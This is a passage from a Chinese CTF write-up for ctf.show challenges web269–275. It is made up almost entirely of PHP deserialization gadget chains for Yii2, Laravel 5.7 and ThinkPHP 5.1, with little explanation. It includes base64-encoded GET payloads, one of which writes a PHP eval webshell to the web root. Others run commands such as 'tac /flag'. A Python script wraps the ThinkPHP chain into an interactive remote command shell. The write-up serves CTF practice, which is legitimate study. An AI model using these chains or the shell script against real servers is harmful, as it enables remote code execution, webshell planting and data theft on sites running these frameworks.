//此处写命令</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo2MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvYmFzaWMvd2ViLzEucGhwIjt9aToxO3M6MzoicnVuIjt9fX0=</span><br></pre></td></tr></table></figure><h2 id="web269-270"><a class="header-anchor" href="#web269-270">¶</a>web269-270</h2><ul><li>描述: 还有姿势</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;); <span class="comment">//此处写命令</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload如下, 然后再访问1.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=</span><br></pre></td></tr></table></figure><h2 id="web271"><a class="header-anchor" href="#web271">¶</a>web271</h2><ul><li>描述: 举一反三</li></ul><p>Laravel v5.7反序列化漏洞</p><p>POST请求发送data即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"><span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>(&quot;<span class="title class_">system</span>&quot;,<span class="title class_">array</span>(&#x27;<span class="title class_">tac</span> /<span class="title class_">flag</span>&#x27;),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(<span class="title class_">array</span>(&quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),&quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;))),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>(<span class="title class_">array</span>(&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Console</span>\<span class="title class_">Kernel</span>&quot;=&gt;<span class="title class_">array</span>(&quot;<span class="title class_">concrete</span>&quot;=&gt;&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>&quot;))))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web272"><a class="header-anchor" href="#web272">¶</a>web272</h2><ul><li>描述: 换个姿势</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>\<span class="title class_">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection=<span class="keyword">new</span> <span class="title class_">MockDefinition</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>\<span class="title class_">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> <span class="title class_">EvalLoader</span>(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockConfiguration</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">name</span>=&quot;<span class="title class_">feng</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">MockConfiguration</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web273"><a class="header-anchor" href="#web273">¶</a>web273</h2><ul><li>描述: 同上</li></ul><p>同样的用上面的就可以了</p><h2 id="web274"><a class="header-anchor" href="#web274">¶</a>web274</h2><ul><li>描述: 同上</li></ul><p>ThinkPHP V5.1 反序列化漏洞, 入口查看源码就可以拿到了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJjbWQiO2E6MTp7czo1OiJoZWxsbyI7czo1OiJ3b3JsZCI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6ImNtZCI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjEwOntzOjEwOiJ2YXJfbWV0aG9kIjtzOjc6Il9tZXRob2QiO3M6ODoidmFyX2FqYXgiO3M6MDoiIjtzOjg6InZhcl9wamF4IjtzOjU6Il9wamF4IjtzOjEyOiJ2YXJfcGF0aGluZm8iO3M6MToicyI7czoxNDoicGF0aGluZm9fZmV0Y2giO2E6Mzp7aTowO3M6MTQ6Ik9SSUdfUEFUSF9JTkZPIjtpOjE7czoxODoiUkVESVJFQ1RfUEFUSF9JTkZPIjtpOjI7czoxMjoiUkVESVJFQ1RfVVJMIjt9czoxNDoiZGVmYXVsdF9maWx0ZXIiO3M6MDoiIjtzOjE1OiJ1cmxfZG9tYWluX3Jvb3QiO3M6MDoiIjtzOjE2OiJodHRwc19hZ2VudF9uYW1lIjtzOjA6IiI7czoxMzoiaHR0cF9hZ2VudF9pcCI7czoxNDoiSFRUUF9YX1JFQUxfSVAiO3M6MTU6InVybF9odG1sX3N1ZmZpeCI7czo0OiJodG1sIjt9fX19fX0=&amp;cmd=tac /flag</span><br></pre></td></tr></table></figure><p>大佬脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">command: <span class="built_in">str</span>, arg: <span class="built_in">str</span></span>):</span><br><span class="line">    url = <span class="string">&quot;http://ac6ae592-f5db-448b-81bd-3544af090bcb.challenge.ctf.show/&quot;</span>  <span class="comment"># 记得保留/</span></span><br><span class="line">    payload = <span class="string">b&#x27;O:27:&quot;think\\process\\pipes\\Windows&quot;:1:&#123;s:34:&quot;\x00think\\process\\pipes\\Windows\x00files&quot;;a:1:&#123;i:0;O:17:&quot;think\\model\\Pivot&quot;:2:&#123;s:9:&quot;\x00*\x00append&quot;;a:1:&#123;s:1:&quot;a&quot;;a:2:&#123;i:0;s:4:&quot;calc&quot;;i:1;s:0:&quot;&quot;;&#125;&#125;s:17:&quot;\x00think\\Model\x00data&quot;;a:1:&#123;s:1:&quot;a&quot;;O:13:&quot;think\\Request&quot;:4:&#123;s:7:&quot;\x00*\x00hook&quot;;a:1:&#123;s:7:&quot;visible&quot;;a:2:&#123;i:0;s:13:&quot;think\\Request&quot;;i:1;s:6:&quot;isAjax&quot;;&#125;&#125;s:9:&quot;\x00*\x00config&quot;;a:10:&#123;s:10:&quot;var_method&quot;;s:7:&quot;_method&quot;;s:8:&quot;var_ajax&quot;;s:6:&quot;whoami&quot;;s:8:&quot;var_pjax&quot;;s:5:&quot;_pjax&quot;;s:12:&quot;var_pathinfo&quot;;s:1:&quot;s&quot;;s:14:&quot;pathinfo_fetch&quot;;a:3:&#123;i:0;s:14:&quot;ORIG_PATH_INFO&quot;;i:1;s:18:&quot;REDIRECT_PATH_INFO&quot;;i:2;s:12:&quot;REDIRECT_URL&quot;;&#125;s:14:&quot;default_filter&quot;;s:0:&quot;&quot;;s:15:&quot;url_domain_root&quot;;s:0:&quot;&quot;;s:16:&quot;https_agent_name&quot;;s:0:&quot;&quot;;s:13:&quot;http_agent_ip&quot;;s:14:&quot;HTTP_X_REAL_IP&quot;;s:15:&quot;url_html_suffix&quot;;s:4:&quot;html&quot;;&#125;s:8:&quot;\x00*\x00param&quot;;a:1:&#123;s:6:&quot;whoami&quot;;s:arg_l:&quot;arg&quot;;&#125;s:9:&quot;\x00*\x00filter&quot;;a:1:&#123;i:0;s:function_l:&quot;function&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;function_l&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(command)).encode())</span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;function&quot;</span>, command.encode())</span><br><span class="line">    </span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;arg_l&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(arg)).encode())</span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;arg&quot;</span>, arg.encode())</span><br><span class="line">    params = &#123;<span class="string">&quot;r&quot;</span>: <span class="string">&quot;test/ss&quot;</span>, <span class="string">&quot;data&quot;</span>: base64.b64encode(payload).decode()&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url, params=params)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入命令...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="string">&quot;system&quot;</span></span><br><span class="line">        arg = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res = <span class="built_in">round</span>(command, arg + <span class="string">&quot; | tee 1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="web275"><a class="header-anchor" href="#web275">¶</a>web275</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 